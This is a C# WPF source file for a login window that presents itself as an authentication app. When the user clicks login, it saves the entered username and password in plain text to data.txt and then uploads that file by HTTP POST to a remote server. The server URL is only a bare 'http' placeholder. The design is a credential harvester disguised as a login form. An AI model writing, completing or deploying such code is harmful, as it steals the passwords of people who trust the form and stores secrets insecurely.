using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net.Http;
using System.IO;

namespace Aunthentiction
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void LoginButton_Click(object sender, RoutedEventArgs e)
        {
            string userName = UserNameTextBox.Text;
            string password = PasswordTextBox.Text;

            if (RememberMeCheckBox.IsChecked == true)
            {
                string data = $"User Name: {userName}\nPassword: {password}";

                System.IO.File.WriteAllText("data.txt", data);

                MessageBox.Show("Data save to file", "Successfully", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            else
            {
                MessageBox.Show("Data was not saved!", "Info", MessageBoxButton.OK, MessageBoxImage.Information);
            }


            string dataPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "data.txt");

            _ = SendFileAsync(dataPath, "http");
        }

        public static async Task SendFileAsync(string filePath, string serverUrl)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine("Error");
                return;
            }

            using (var httpClient = new HttpClient())
            {
                using (var content = new MultipartFormDataContent())
                {
                    var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
                    content.Add(new StreamContent(fileStream), "file", System.IO.Path.GetFileName(filePath));
                    var response = await httpClient.PostAsync(serverUrl, content);

                    if (response.IsSuccessStatusCode)
                    {
                        MessageBox.Show("Send", "Info", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                    else
                    {
                        MessageBox.Show($"Error: {response.StatusCode}", "Info", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                }
            }
        }


        private void CancelButton_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }
    }
}
